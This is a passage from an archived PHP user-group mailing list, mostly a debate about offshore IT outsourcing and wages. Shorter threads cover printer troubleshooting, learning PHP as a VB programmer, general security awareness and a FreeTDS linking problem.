lesser risk of chucking the job to go it on your own?

It is no different than any other industry in America. They will do it 
until we all get screwed, and then they will change it. Until that 
happens, they will take the short term profits and to hell with 
security/reliability/or whatever.

We saw it in the acountng industry - eveyrone cheated until the system 
collapsed.
We saw it in the energy business (and continue to see it now) - Enron 
had the cajones, but everyone else went along for the ride.
We are on the verge of that issue in broadcast media - so few owners for 
all the radio stations, no one cares to listen anymore.
We are on the verge of that in the recording industry - so little gets 
to the innovators people don't mind sidestepping copyright.
We are on the verge of that in the banking industry - look at the latest 
Wachovia deal... does anyone care about their bank anymore? Does it matter?
We are on the verge of that in the credit industry - billions in fraud 
are written off yearly; does anyone care?

Place your bets as you see fit - short term (outsource) or long term 
(independent technologists and small businesses).

Personally, I am waiting for the entrepreneurs in data mining to start 
hiring laid off Indian programmers in India, and aggregating all the 
consumer data they steal when they leave on their last day. They could 
build a better Axciom pretty quickly, and that's big bucks (as well as 
doom for outsourcing).

You may be closer than you think.  A potential client I Was talking to
is married to a VP of a large comapny.  We were discussing outsourcing
and he mentioned (implying that the VPs were thinking this way) that
outsourcing was being used to drop salary requirements for techs; move
work offshore, lay off people, salaries drop, then bring the work back on
shore hire the techies at much lower prices.

Now, I'm not the type to wear tin-foil hats but I'm seriously thinking
about it. :-)

BTW, does anyone know of a successful off-shored project that wasn't
brought back on-shore because it was a disaster?  I've never heard of
one.

strategies for job hunting, finding freelance work, programming techniques,
and/or new technological developments.  I'd also like to know what you guys

in the first place.

Please reply off list to me about this.

Subject: [nycphp-talk] Off Topic: International Outsourcing
Message-ID: <40E237A7.40700@ceruleansky.com>

Hello all,

It has been very interesting to read your thoughts on outsourcing. I 
have to compliment many of you for being open minded (perhaps even 
magnanimous) when it comes to this subject; I say this because there is 
a common perception that the downturn in the technology sector is being 
exacerbated by the transfer of jobs abroad.

I come to this issue with very mixed feelings. I grew up in India - the 
country that now strikes fear into many hearts because programmers there 
  are happy to work at lower wages than people in America are. I have 
recent seen (in business dealings) that when I mention India, there is 
visible wince.

I went back to India early this year to the city I grew up in - Pune - 
which was mentioned in the recent Wired article. It is a new city - the 
middle class has greatly expanded, and many of the previous middle class 
members have joins the ranks of the upper class. Regardless of one's 
major in college - be it Engineering or English - people are signing up 
in droves  at computer programming institutes. People wake up at night, 
and drive to call-centers to work. The bright light of the Indian spring 
shines everywhere, and the colors seem more vibrant than ever. People 
are happy  - and more prosperous than ever before.

Then I come back to New York - to this economy. It is still a bit slushy 
  in March - the grey snow does not seem to have fully melted (at least 
not in my mind). I seem to catch the glare of another angry New Yorker 
out of the corner of my eye. And then it hits me: I am another bitter 
New Yorker myself.

For years the backers of free markets said that it would prosperity to 
poorer nations. People who had been praising Ricardo for his theories of 
competitive advantage now railed against the impending doom that could 
be brought on by the movement of jobs to India and Eastern Europe.

And the funny thing was - I kind of felt it too.
I started my design and development business at the worst possible time 
(the Fall of 2002), and I have hung in there ever since. I would be 
lying if I said it has been easy.

I recently posted a help wanted ad on Craigslist for an internship with 
a modest stipend ($500 per month). I got over 100 responses, some from 
people with MBAs and Computer Engineering degrees.

So whenever I see people boasting that they earn such-and-such an amount 
per hour, or that they would not accept anything less than a particular 
amount, I nod, smile to myself and think "good for you then - if you can 
manage it".

During the last three hundred years, India has undergone great pains and 
great poverty. If the free-market system means that millions of fellow 
Indians can be liften out of poverty, then what's so bad about it?

Well - I just wonder if the free market system is a win-win or a 
win-lose system. If it is a win-lose system, I should just hire 5 people 
in India, and start marketing like crazy here in New York. "If you can't 
  beat 'em, join 'em", right?

But what about the immediacy of dealing with local businesses? What 
about the communication difficulties that arise from having to use the 
phone and instant messenger instead of meeting face to face?

And why should I pay someone in India $600 per month to work remotely, 
when I can get a qualified intern for $500 per month here in New York?

If this great capitalist system can only have a few winners, I want to 
be among those selfish few. I know - it sounds crass and stupid, but I 
don't want to be among the dazed people sleeping in the subway station, 
or those digging through trash cans, or those pushing around carts 
loaded with recyclables so that they can exchange them for food.

I have come to the realization that in this city - and perhaps anywhere 
else in the world - it's every man for himself. If I were to be run over 
by a truck, people would probably step over me.

So why should people in India not seize the chance for a better life? 
Who cares if people like me think that downward wage pressure from 
outsourcing could affect me negatively?

If it's the market meeting out the justice, then justice is already at 
work - if qualified people in New York are willing to work for $500 per 
month, then India has just been out priced. There is too much demand for 
people who speak English well there - so much, in fact - that their 
market cannot catch up fast enough.

For the last one hundred years, America has seen a dramatic growth in 
prosperity. Perhaps now it is time for other nations to stake their 
claim at the same thing.

Best Regards,

- Jay Sheth

I just wanted to thank everyone for their opinions on this subject. I 
know it was off-topic, but after reading the Wired article I wasn't 
exactly sure how to feel; I'm still not.

Many of you had such immediate responses; it was amazing. I wrote so 
many drafts of things I wanted to say, but as the replies kept arriving, 
I couldn't help but just sit back and take it all in. I don't think I am 
even qualified to say another word on the subject. But then again, I've 
always been more of a perceiver than a judger.

Thanks.

As an update to below:
I am sitting here watching several animated sprite butterflies fly
around a grass-tiled mapped field.
All done in php-gtk.. 

for pathfinding, will use A* algorithm. Found a large selection of
sprites and tiles to use (all royalty free) tiles for
grass/trees/water/desert/snow etc.

Will add in animal stats/behaviors later (also a creature-gen), thinking
I will venture out from what terrarium is doing and have bugs, rats,
cats, dogs birds etc.. Make it more like a "biodome" than a terrarium..

heh.. yes yes.. this should be done c.. but hey, why not do it in php?

It is like I said before, if you are willing to work for less than you are
worth you have just lost the game. I know that if you are funding your own
education, an MBA or engineering degree can cost you thousands of dollars in
student loans, what a tragedy that people who have spent upwards of $40,000
to $80,000 for an education are willing to work for $500 a month. Kind of
makes the whole thing seem pointless when McDonalds pays more than that to
high school students with no education at all to flib burgers and serve
french fries.

Of course the idea of working the internship is to get expereince so you can
get a real job, but if the real jobs are nonexistent and / or outsourced,
what again I ask is the point? This is why I never reccomend someone get
into this line of work unless they are willing to relocate to India,
Bulgaria, Romaina or elsewhere.

I have nothing against people in India, or elsewhere who take advantage of
outsourcing. Hurrah for them. I only wish there was a country that was
willing to outsource work to us on the same level. Of course you cannot
blame someone in India for taking advantage of the money they can earn...
great for them. For those however that have staked there life work in the
field, it is not so easy to see it all go away and start over once again.

It seems that if you want to remain competative you really have no choice. I
have already come to that conclusion myself. I am a Marxist at heart anyway,
so for me, it has always been a win-lose system. Unless of course you are
not on the butt end of things trying to be a worker.

When your labor comes at 1/10 the cost, these are problems often seen as
worth it. Think about it, you get rid of 10 programmers or high tech workers
at $60,000 a year, and replace them with ten at $12,000 a year, you just
saved $480,000 a year, with that money you hire 3 people at $35,000 a year
to deal with these issues. Then you can brag about all the jobs you created,
and brush aside the fact that you lost 10.

Of course this only works for a short while, once your competition does the
same thing, now you may not make enough money to pay your three at $35,000 a
year due to the competative demands driving prices down, but that cost will
be offset by the fact that people in India will once again have lowered
there own fees due to the intense competition once that market is flooded
with a pool of tech workers that outnumber the tech jobs.

In other words for the same reasons you can get an intern here for $500 a
month, tech workers in India today who enjoy $12,000 a year will eventually
find themselves in the same boat having to lower their own wages.

If you can keep that qualified Intern long term sounds like a great plan,
but can you really afford to live in New York for $500 a month? How long can
that last?

Now you truly understand how the system works, capitalism is like a big
pyramyd scheme. There can only be a few winners by its very nature, just
make sure you get in early so you can exploit it for all its worth. Is this
sinicle? Perhaps but until things are changed for the better, how else is
one to survive. I don't want to be eating out of a garbage can anytime soon.

Not only that, they will most likely scoff at you for being in their way
too.

Poeple in India should exploit the status quo to the fullest and enjoy it as
long as they can, for it will only be a matter of time before cheaper labor
is found elsewhere and the opportunity will be gone for them.

This is an excellent point ... I mean whats the real point of technology anyways?  Build games?  Fry the 
brains of kids with new exciting features in online messaging?  Faster Eminem downloads?  There are 
millions of areas in which LAMP witin the country that would prove resourceful @ the only cost of the 
programmers ability to get the task accomplished.

What LAMP actually needs is more case studies (even fictional ones) ... for example I just read that 
buildings in NYC can $ave money if they hardwire XML to Con Edison.  I find it both disturbing + 
interesting @ the same time.  But Im sure more examples such as that will start popping up.

It would be 'preaching to the choir' for me to 
suggest (on this list) that PHP 5 should be among 
the top candidates for implementing systems which 
exchange XML documents.

On a side note, if there are any PHP 'evangelist' 
types, who will be (back) in NYC relatively soon 
and can carve some time out of their schedule to 
give a talk on how to implement XML document exchange 
with PHP 5, please contact me (off list).

How is the printer attached?  Ethernet?  USB?  Parallel/Centronix?  If
it is networked (RJ45 Ethernet), configuration is not that simple.  If
you follow the print wizard, you will go wrong.  Let me know, maybe I

Sorry, I've turned to everyone I know, and everyone I know knows Linux 
now (including me) and not XP.  Barring reconfiguring everything to RH 
(dream, but not reality):

We have two new XP-enabled machines here at work and neither will print 
using our existing HP LaserJet 2200 Series PCL 6.  I downloaded the 
proper drivers from http://www.hp.com and attempted several 
reinstallations of printers, to no avail.

Each time it will attempt to print, only to time out and throw a 
timeout-related error each time it tries to print: "The document has 
failed to print".

Has anyone out there had experience working with both XP and HP LaserJet

printers? I am on a serious time crunch and have to have this configured

by morning and I'm stuck!

Help!

Thanx
Phil

It's attached via RJ45 Ethernet.  And the company is getting someone 
else to do it apparently at this point.  I had it working last night 
whereby I was able to add them to the network workgroup (rather, re-add 
them) and then was able to print; somehow, they can't print anymore.

Here is how I set mine up on my home network:

1. Assign the printer an IP address.  For example, 192.168.1.___.  I
can't help you with this, you need to look that up in the manual.

2. Click Start --> Settings --> Printers and Faxes, then Add Printer.

3. Click Next on the first wizard page.

4. This is where Microsoft screwed up.  DON'T click the "Network
printer" radio button.  Instead, click "Local printer attached to this
computer".  Yeah, it makes no sense at all, but it works.  Uncheck the
"Automatically detect" checkbox, and click Next.

5. Select the "Create a new port" radio button, and select "Standard
TCP/IP Port" from the dropdown list.  Click Next.

6. As the next screen says, make sure the printer is powered on and is
on the network.  Click Next.

7. Type in the IP address, and the port name will be automatically
filled in.  Click Next.

8. After that, just follow the prompts to find your printer from the
list, assign it a name, and print a test page.

We've already done that step a long time ago as a matter of fact.  I was 
able to even view the webpage generated by opening a browser and putting 
in the IP for the printer on the "good" and "bad" machines.

All of the other PCs are set up this way already for configuration with 
the printer.

Actually, that port had already existed.  For good measure I deleted 
that port and recreated it entering the IP address (see Step 7).

Bill, I did all of that last night, to no avail.  It would still not 
print when set up this way; even though the other machines were set up 
exactly in this format to a tee and can print, the 2 other machines 
could not.  I had managed to connect to a network printer using the 
network domain workgroup name and it worked until this morning - no 
explanation whatsoever, it just stopped working!

I know I'm lowering the signal ratio of the list with this one ;)

I was merely trying to point out that after all this, you should check the
physical connections to that device. If they appear solid, connect a
different printer in its place and see if the same problem exists.

I'll take it off-list if more help is desired.

Phil, sounds like you did everything correctly.  Like Chris said, check
your connections.  You should be able to ping the IP.  From "Printers
and Faxes", right-click the printer, select Properties, and try to print
a test page.  This is going to take some additional troubleshooting that
I can't help with remotely.

The best way to learn is to do.  As already mentioned, tell him to bring
a LAMP box online and have him write a couple applications.  Start with
real simple stuff, then grow into more complex applications.

Another effective way of learning is to hack around with someone else's
code.  For instance, take a small, fairly well written PHP application
and tell him "it does X now, I need it to do Y".

http://gnubies.org might be a good start, although generally Linux
specific.  http://nycbug.org is newbie friendly, but of course BSD
specific.  I think sending him to NYPHP meetings is a good bet, since we
generally have a wide variety of talent at the meetings that he can talk
to over a couple of beers.

Not specific to AMP, but there's:

http://home.netcom.com/~casandra/linux/calendar.html

Also, I know we had talked about free workshops/install fests/ for AMP,
which seems inline with exactly what he needs.  We could even have one
for "Moving from VB to PHP."  This might be perfect motivation to get
this project underway, especially if we can find some free space to hold
the event at.

And if they tripped, they would sue you.  (rimshot)

Most folks in IT haven't been around long enough to remember what it was 
like back in the 'old days', when working in IT meant hideously low pay 
and occasional ridicule from other staffers from other departments.

In the 80s tech started to get sexy.  In the 90s it just got waaaaaay 
outta hand.  Now in the 2000s we are seeing a normalization where we 
sink back to how it was before, although probably still better than how 
it was in the 70s.

One big thing that is causing this is the 'our stuff is so easy to use, 
anyone can do it' sales pitch.  Expectations of non-techies are slowly 
reorienting from 'geez, computers are hard, we need a geek' to 'this is 
supposed to be easy, why would I need a specialist?'

Then there's the whole 'bigger, better, faster, cheaper' phenomenon most 
associated with technological development.  "Why not people too?", is 
the common thought.

Is outsourcing really such a big deal, when all of these other factors 
are making such a huge impact on the IT employment landscape?

I helped start a website that gets over 10 million visitors a day - but 
I cannot work for them anymore because I am a father now and my most 
important priority is my wife and kids.  I can, but won't, work from 8AM 
to 8PM six days a week anymore.  And I'm not living paycheck to paycheck 
anymore, so I can be choosier about my environment.

So sure there is an age bias of sorts, but it is not because of age, but 
because of priorities and values.

We are in an industry that - in the whole scheme of things - is only a 
few minutes old.  There's plenty of unsettled aspects of the industry 
that will take years to stabilize and become more defined.

I think that the outsourcing topic is way overblown, and that there are 
much more significant events taking place that will have infinitely more 
long-term effects on our careers.

I don't know of anything offhand, but some of the commercial control
panels written in PHP can take care of this... however that's probably
overkill.

I use PHP cron scripts extensively, but never had a need for a
management utility.  It'd be simple enough to write, but that said, it's
good for someone to learn the crontab syntax :)

Is this when compiling FreeTDS itself, or PHP linked with FreeTDS?

Seems like a linker problem.  I haven't touched AIX in this lifetime,
but check that your ld.so.conf, ldconfig, etc. knows where to find
everything.

We'll probably have to take this offline then.  I checked the 
connections and the "bad" machines are fully capable of pinging the 
printer's IP.  But attempting to print a test page consistently fails 
for the "bad" machines (but the good ones are just fine).

> It's absurd.

Let's keep OT discussion to a minimum guys, and if they do happen, let's
try to keep superfluous posts to a minimum.

There's a lot of talent on this list, but they stick around because the
signal-to-noise ratio is low.  If a discussion becomes off topic, let's
take it offline.

Thanks guys,

Jag forstar inte det!! HUH?? Signal Ratio?  Dude, I'm a web guy!  You're 
talking over my head so much I'll have to start using $50 apologetic 
phrases like "Ontological" in response.

There are no physical connections apart from the printer being connected 
to the router like all of the PCs.  The connections are solid and the 
"bad" machines can ping the printer IP.  They just can't print, not even 
a test page.  And there is no "different printer", we're a very tiny 
company and have only one printer.

I'm taking this off-list now to avoid further off-topic threading 
diversion issues.

The threat is used all the time, but in my exerience good people who are 
threatened leave -- as opposed to settling for less pay. Maybe they 
don't lave right away, but they commit to leaving at first opportunity.

When a company burns its internal social assets it is doing so with a 
purpose; it has already made a decision to abandon the workers for a 
value proposition. Workers should not ignore those signs. It is my 
belief that most "sick" organizations are sick because management has 
made the decision, but failed to execute (yet) and the workers are in 
limbo (and in their guts they feel it). If workers took the clues and 
left, or if management made swift decisions, everyone would be better 
off. Unfirtunately senior management often second guesses itself, middle 
management holds on with disbelief or optimism, and the regular guys get 
screwed.

People say the rats are the first off a sinking ship because they can 
smell the future. The truth is the holds at the bottom of the ship fill 
with water first, causing the rats to run for dry land while everyone 
else waits around unaware that the holds are full of water and the ship 
is sinking.

A bit more searching revealed that this was a problem with PHP 4 (to be
addressed in PHP 5) when calling classes statically.  The solution?  Add a @
on the front-end of the line and everything works fine.

@$mail =& Mail::factory('mail');

The best way to end a thread is to ignore it, which I had intended to
do.

Now this thread is dead... explicitly.  No more posts on it.

PHP5 on dedicated hardware on a dedicited line between two points, 
shuttling data feeds. Sounds like a *nix router to me... one that is 
on-the-fly-configurable with one of the strongest parsing languages 
available, built from the ground up for web services.

Hmm....

this is begging the question:  when does an economic system undermine the
needs of the the society it is designed to serve?  (it's a loaded question,
too.)

capitalism has historically served as a mechanism for increased
opportunities.  i'm starting to wonder how the current state of neo-liberal
economic policies are serving me, my nation and the world at large.  so long
as labor practices are fair in these off-shore locations, the gain remains
static (or even greater) in the aggregate world view, but that doesn't help
the local needs.

on-shore this activity benefits the rich and the anonymous stockholder but
undermines the very society in which they participate?

(btw, this is what is so cool about the free software movement -- it is
based on the bounty of communal cooperation and not the scarcity of
individualist hording.)

noodling.

I know of a money center bank, who (more than) hinted that they 
were looking into outsourcing. They suffered a brain-drain of 
about twenty developers (out of about 110) within two months.

The two executives responsible for the 'brainchild' also left 
the company -- ostensibly for greener pastures.

It probably is viewed as "undermining" when a person's ability to maintain
their revolving debt and/or the quality of life to which they are accustomed
is hampered by a lack of wage-bearing work.

Or in other words, "I got my Oracle DBA ticket so I can buy a Hummer but the
company where I work switched out to direct consulting from Oracle after I
was a year into the payments. Now I can't afford my Hummer!! #%*@%^@#^
outsourcing SUCKS!!"

What would be the strongest authentication process for this do you think?  
For example is tunneling ssh or stunnel the very best method considering 
that a) both end points have to be setup on the box already (user) and b) 
using public key authentication is considered "safe" for the time being.  

Im trying to think in terms of a smooth safe transaction (ive seen alot of 
recommendations for "Secure-XML" but have not followed up on it in a 
while, OASIS had their own method from what I recall.

hehe.. i feel the cynicism!  ;-)

your illustration points out the inherent conflict of interest between a
society and an individualists perspective.  is fraternity hopeless against
the tide of globalization?

it seems to me that a more tempered market system that measures all factors
in the cost/benefit analysis, not just the GDP, is warranted:

Well if an economic system were to limit you to 5% of the total market we'd all eventually be undermined (http://www.census.gov/main/www/popclock.html).  

Innovation is the single ingredient that allows countries like the US to keep such a large slice of the world's economic pie, even with open/liberal/free trade.  We just need to make sure we don't start outsourcing it as well.

This is a great suggestion, and I've given this advice in the past myself,
but I think we might want to mention a few examples. Let's be honest - 99%
of open source applications written in PHP exhibit awful design, poor
programming practices, and blatant disregard to security. I'm afraid that
people will "learn PHP" by hacking on something like phpBB, unless we
point them in the right direction.

Unfortunately, I don't know of any good examples. I've heard good things
about coWiki's code. Anyone know of other well-written PHP applications?

How does this apply to the replies when someone posts a message saying,

I guess the first thing you would need to do is define "society".
Is it just the US or the world or some subset thereof?

Keep in mind that the aggregate view and the local view are fractal;
we're discussing world v nation, but it also applies to nation v state
and regions v municiplaities, etc.

True, but the selfishisness (in FOSS term the "itch to scratch") is
still paramount, IMO.

And least is some cases, the wince is due to a disagreement with the 
Indian *value system*. While we are aware of the homeless on our streets 
while we walk to our high-paying jobs, we are also aware that we have 
done alot to help them. I won't argue that we have done *enough*, but 
the average American knowledge worker can justify going to work and 
living a decent life, and many of them feel guilty about less fortunates 
and do try to help them with donations and support. Now when we see 
India and we see "knowledge workers" zipping along on motorbikes to good 
jobs, and outsourcing entrepreneur millionaires boasting of their 
castle-like compounds, with *extreme* poverty widespread, and many, many 
living with the relative equivalent of slaves in their families' homes, 
we judge them for their values. Golddiggers come to mind, and the 
Goldrush mentality. People who behave like that are often scorned. They 
are choosing to shop for Prada on the streets of a city world famous for 
street poverty. We are choosing to shop for Prada on streets famous for 
entrepreneurial opportunity (so famous, it is a target for anti-American 
and anti-capitalist terrorism).

Of course we similarly scorn our corporate theiven, overpaid CEOs and 
monpolistic robber-barrons. It is argued that theose people are not the 
norm, and many argue they are a necessary evil for a hierarcical system. 
How many stories can India produce where street poor from the lowest 
caste became jet-set millionaires based on their cunning, luck, 
ingenuity, and hard work? We can count hundreds of thousands at least... 
too many to try and count. If you say it is too soon, ok. But do we have 
faith that the Indian social system will encourage such equal 
opportunity? Our system is biased by corruption, and we had our 
robber-barrons, but our system is not (yet) systematic corruption.

You call it "the bright light of the Indian spring" and we know it as a 
spark. Unless nurtured carefully and with respect, it ain't gonne be a 
bright light of spring for long. When I see (and I do see) Indian 
outsourcing entrepreneurs hawking their cheap labor at every network 
meeting in high-tech North Jersey, I dislike them for their agressive 
gold-rush demeanor, and their detachment from the social issues. It is 
all about money for them. Will I do business with them? Yeah, the next 
time I want to do business that is all about money (PS: I never do 
business that is all about money).

Yup.. happens to the best of us. That early April snow makes quite a 
mess on New York streets. Books have been written about the New York 
rudeness. Look up the Kitty Genovese story and re-hash that pop psych 
stuff, or go visit China and see how society handles being even more 
crowded than NYC, with the addition of an oppresive culture-control 
government. It certainly makes poetry harder to understand, but the 
beauty is still in there, sometimes richer than ever -- you have to know 
how to find it.

And I went to graduate school with Indian students who already had 4 and 
5 Master's degrees, working on their next. I went with Taiwanese 
students of "Environmental Engineering" who earned top grades yet had no 
interest at all in anything but the computer business. Would I hire 
someone who had 5 Master Degrees? Nope. Would I hire the guy with a 
passion for the computer business, if I needed an environmental 
engineer? Nope. What's the point? I don't know many managers who would 
hire someone off Craig's List. If that's where you compete, good for 
you. But do you really expect to find top people advertising on Craig's 
list for $500 internships?

It's not the market (yet). It's an entrepreneurial experiment on a large 
scale, feeding the low end of demand for anonymous workers. It will 
correct, and then we will see what fits where.

Yawn.

It's not a serial game, and America has not the monopoly. Now if you 
want to adjust your culture and >1 billion person consumer markets to 
mirror ours (I think they call it "westernizing") then hey, guess what? 
Your  consumer market starts to look just like ours, and we can sell 
into it and perhaps even dominate it! Woohoo! But are consumer markets 
everything? What about ancient Greece and Rome, Egyptia, other former 
leading civilizations? Are they remembered for their Coke's, their Big 
Mac's, and their Chia Pets?

Very interesting stuff for a PHP talk list, for sure. I've got a 
free-as-in-software beer for Jay any time he wants to claim it.

Well..
basically, avoid just about anything on hotscripts.com it is 99% "my
first application" stuff.. Though, sometimes there is some interesting
approaches there.

As for hacking on shit, I learned a *LOT* from hacking on the ad server
called OASIS.

Most of the apps that have web-based installs are also worth looking at
as that displays a level of skill that the "my first app" guys will not
have.

Just some thoughts.

Subject: [nycphp-talk] Introduction
Message-ID: <6ec19ec70406300922d00dfe1@mail.gmail.com>

Hello All,

I have had the pleasure of attending two NyPHP meetings (the most
recent two in fact) and really enjoyed them, and hope to continue the
learning by joining and participating in this list. It was suggested
that I introduce myself, so here goes.

I am living in NYC for the summer on a work visa, and will be
returning to Canada on or before August 31, or Homeland Security will
be more than happy to assist me to the nearest detention center.

I started playing with PHP quite a while back in what I might is the
standard way for programmers. I was using a program (phpBB) that
someone else wrote and was curious as to how it worked. Experimented
for a while, discovered I enjoyed coding in PHP, and the rest they say
is history.

I am currently working for MetaMachine (authors of eDonkey & Overnet)
here in NYC, and am able to use PHP on a limited basis, making changes
to phpBB and cleaning up some of the admin interfaces we use to manage
our User & Advertiser accounts. I have used PHP in many personal (my
website, small pet sites, etc,) and professional (here, built the
Enwin Utilities corporate intranet, etc) projects, and am looking
forward to PHP5.

My particular interests in PHP would be scalability, templating and security.


thanks for having me
paul

I completely appreciate the posts, but right from the start these things 
are exactly what stops a VB person from going PHP.

In VB/M$ land, "Hello World" is an example of professional programming. 
In OS/PHP land (to read these recent posts) even writing phpBB is unworthy.

People need to feel they are "OK programmers with an opportunity to be 
great" not crappy-programmers-in-need-of-improvement. Granted, we are 
all crappy programmers seeking perfection, but might that confidence be 
the separator between the M$ camp followers and the OS people?

Asking this guy to build a box is way over his head. Agreed that is a 
problem, but giving him a box to build doesn't get him there. Asking him 
to hack on an ad-server app will require careful 1:1 scrutiny with a 
considerable level of PHP expertise - not an option. I agree completely 
about the need to rate hotscripts and the like for "appropriateness" but 
that doesn't exist either. These are great ideas for talking an average 
PHPprogrammer to new levels of understanding (I'd like to do them 
myself, thanks for the suggestions :-) but not the newbie/VB person.

I thought InvisionBoard would be good to show how OO *was* used with 
PHP4 scripts (it's totally coded around a constructor-based layout) but 
with PHP5's OO revamping of OO that may not be a good idea. I thought my 
own html header management stuff would be good for teaching how PHP is 
used as a server-side HTML management system, shy of templating, but 
there is way too much platform stuff involved, and the objectives are 
all SEO and semantic marketing - way over his head and not something I 
want to be training.

I am very close to setting him loose with the CLI as a parsing tool and 
having him build an access log analyzer.... tons of good PHP to do, 
modular approach, constant parallels to VI and *nix CL tools, etc and I 
can even set him loose on WebTrends so compare results... but he's not 
my hire so unless I can garner value from that idea I can't afford the time.

I might add that these people spend alot more money on tools and stuff 
than the OS people I know... perhaps if there isn't a community resource 
to encourage/support crossover to OS/PHP land,  there is opportunity for 
a short course on building a box/setting up LAMP, to be sold to such 
people used to buying things like VB add-ons and widgets?

Obviously, if they want the best PHP textbook ever written they simply

Hrm, when I first started PHP I was coming from a Microsoft shop. They
had me build a code repository in PHP as a way for me just to get my
feet wet.

There are good examples and bad examples, the majority on "app" sites is
not good, we are not saying they all are. Pick careful.

True, have him make a simple app with no real expectations for it. Give
him a two week (or one) timeline. The main points to focus on are
Database queries (selects/inserts/deletes) and display (for web based
stuff)

I agree, asking a noob to 'build' a box is going to send them into panic
mode. I suppose that baby-steps would be a better option here.

Perfect, that will also teach him a lot about linux in the process
without throwing him in the deep end.

VB programming has a lot of comparatives in PHP (you would be surprised)
a lot of the core ideas and techniques are the same..

Speaking of which, mono 1.0 came out today so I am off to play with
that, I may move my little sprites app over to GTK#

Yes I  know - though starting now without any savings to live on during

Believe me, I have thought about this many times (Visions of hydroponic 
farms with computer-controlled climate and irrigation systems feature 
prominently in my thinking).

I have a friend who left New York and went to live in New Mexico. He 
bought 6 acres outside of Taos and is planning to build an "earthship" 
(for those of you that don't know, an earthship is an 
environment-friendly self-sustaining dwelling - we're talking solar 
panels, geothermal systems, harvesting rain water, natural sewage 
systems, etc etc. See http://earthships.org/ for info).

Also you could keep an eye out for projects that 
New York PHP will be doing. Perhaps you could get 
the friend's programmer involved with one which  
would help him understand how to develop in PHP.

I am pretty sure the guys working on the projects 
would help him over any 'rough spots' he might encounter.

Although you can discover a lot by working on you own,
it's definitely quicker to have an experienced hand 
help you.

Here is my beleif ... the best way to accomplish good programming practice is 
to first, think like a hacker, some of the best books to read @ any programming 
language level are those spooky ones, know your enemy, etc, etc, etc ...

The reason for this is extremely important, you want to get to know what a 
hacker will get out of your application ... for example the classic 
man-in-the-middle attack of someone on the network eavesdropping ... if you 
write a PHP app for SOAP<->SOAP communication and it works along the network 
*but* has sensative info, you should run apps to capture this data and view it 
for yourself.  It took almost a year of reading security books to understand 
the implications of non-secure programming design.  

Chris's CSRF opens a whole new level for myself (not sure about others) on bad 
code which Ive written that I had to go back and explore, however if I would 
have taken the time to understand it in the beginning I would have been better 
off.  

Also, 8 out of 10 people I know use pre-packaged software with the same exact 
table information,layout,design,etc as the original.  Think about it, if 
someone hacks and figures out something malicious on one package, it leaves 
everything else open and to myself this is the #1 item which has given PHP a 
bad name because if everyone is going to use PHP-Nuke the same way then you are 
open to bad stuff.  

Anyways, PHP is a learning experience that should emphasis security first and 
foremost, it should be the 1st chapter in every book but unfortunatley its not.  
For example if CSRF/XSS was covered *first* and mandated in every PHP book to 
be there (like a generic thing) vs. just a blurb or cute warning box, it would 
really help the language and its learning programmers.

Many VB6 programmers feel abandoned by MicroShaft.

Too often they feel their only options are vb.net or C# -- 
some are waking up to PHP though.

funny that you mention because I am sitting here installing the new mono
1.0 and monodevelop which is .net C# and gtk# for cross platform apps..

Have a few apps I need to make, and I may also do my screensaver app in
this and keep the server portion in php..  As this supports graphics
libs so that I don't have to write my own... :)

I go back to the VB3 days and have used VB4 and VB6. When .NET came out 
I said, "Dot to heck with that!"

As for making the shift to LAMP, this was the approach I took (not all 
that different from what had been proposed by others).

a) Got an old PC.
b) Got RH Linux 9 bible and learned to set up and configure Linux and 
set up a web server (the PHundamentals article at 
http://phundamentals.nyphp.org/PH_virtualhosting.php is based, in part, 
on my experience with setting up a server). I had to reinstall it four 
or five times till I got it right.
c) Installed Putty and got used to using SSH.
(Note: the above (a,b,c) required learning how to set up services; using 
basic commands such as ll; mkdir; less; grep; how to set up permissions; 
how to use Pico, etc. All this stuff learned from setting up a box is 
useful.)
d) Picked up a bunch of books some of which are listed here 
(http://phundamentals.nyphp.org/PH_bookrecommendations.php) though I 
would now add to the list Rasmus/Lerdorf "Programming PHP" and 
Williams/Lane "Web Database Applications" which has a great application 
to learn from.

I would not recommend throwing a VB coder into the land of "classes and 
objects" in PHP until the programmer has more familiarity with the 
workings of PHP. The syntactical differences between VB (pre VB.NET, 
that is) and PHP take a bit of getting used to.

Message-ID: <40E2FFF5.8030307@ceruleansky.com>

Hello all,

this is an interesting discussion: is a "good" program one that is 
comprised of clean code, or one that fulfills a need?

John wrote:
 >In VB/M$ land, "Hello World" is an example of professional programming.
 >In OS/PHP land (to read these recent posts) even writing phpBB is 
 >unworthy.

This is an interesting point. Thinking back to my own experience, I have 
the following to say: I created a content management system which I have 
successfully customized and resold to several customers. It gets the job 
done, it works without major (security / data loss / usability) bugs, 
and the customers are happy. But from the point of view of "cleanliness 
of code" and overall "architecture", there are many things that I would 
like to change.

I sat down one afternoon, determined that a complete rewrite was the way 
to go. After a couple of weeks of work, I made quite a bit of progress; 
but the new system had hardly any features, and quite a few visible 
bugs. The architecture was nicer, the code was (ostensibly) cleaner - 
but from a value-added point of view, I had not gotten that far.

In that moment, I realized that all the hours I had spent writing Rilke 
CMS were also hours spent learning PHP. And that, while the code 
contained therein was not the equivalent of a well-aged Chianti Classico 
or a sumptuous piece of Vermont cheddar, it satisfied the customer's 
hunger for a system that let him update his own site.

All the little tacked-on addons, all the little code pieces shoehorned 
into a system that was growing too fast - they all did something useful.

When Netscape engineers decided to throw out the old Netscape 4.x code 
base in favor the new, unfinished Gecko codebase in 1998, they went 
through what I am feeling now: "old is bad, new is good".

In evaluating the usefulness of software, it pays often to think of the 
business value added by that program. Even if I write a piece of 
software that has the cleanest code in the world - if it does not do 
something unique, if it does not scratch someone else's itch, then it 
probably will not scratch mine.

All these pieces of often-derided software: PHPBB, Gallery, Microsoft 
Windows, etc - they all have served useful purposes at some point.

But what about security? Yes, that's a valid point - writing secure 
software is important, but it does not always happen. Business 
deadlines, fulfilling marketing requirements and the desire to stay in 
business by shipping attractive products on time force companies to 
think of producing software that will be in demand - not software that 
cannot be broken into.

I think it speaks to the inner-burglar in all of us when reports of 
another computer trojan or virus outbreak storm the front pages of 
newspapers. As food for thought: why should banks have locks and 
security cameras? Why do houses have doors and locks?

Does the problem lie in the weakness of locks, or the lack of human 
restraint?

Best Regards,

- Jay

This sounds like a good idea. As someone who spent almost a year doing 
ASP (bleh!), I found PHP easy to pick up especially if you've done some 
Perl before. I would be happy to lend a hand here.

This is clearly a linkage problem. You may want to try specifying where 
your freetds libraries are - you can do that through configure options 
(run "./configure --help" to see all options) or by editing the Makefile 
and adding a -L flag to the compile lines.

What bothers me though, is often the workers are sacrificed for 
short-term gain (especially in public companies that have to appease 
